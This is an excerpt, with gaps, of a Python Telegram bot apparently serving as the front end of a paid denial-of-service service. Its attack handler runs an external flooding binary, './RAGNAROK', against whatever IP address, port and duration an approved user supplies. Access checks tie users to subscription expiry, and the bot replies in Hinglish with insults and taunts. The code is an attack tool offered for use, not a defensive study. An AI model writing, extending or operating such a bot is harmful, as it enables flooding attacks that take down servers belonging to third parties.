...
async def clear_logs_command(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️BHAK LODE 😡.*", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./RAGNAROK {ip} {port} {duration} 900"
        ...
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ server pe attack lg chuka ! ✅*\n*attack lgane ke baad feedback bhi dena hota ?✨✨🤗!*", parse_mode='Markdown')
...
async def attack(update: Update, context: CallbackContext):
    ...
    if user_id not in users or get_remaining_approval_time(user_id) == "Expired":
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Kya Re Chomu Apne Aap Ko Owner Smjhta h Ja Apne Papa Se Permission Le @offx_sahil.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Abe Wait Kr Na Phla Attack Khtm Hone De or 120 sec Se jyda Kiya To Ban.*", parse_mode='Markdown')
        return
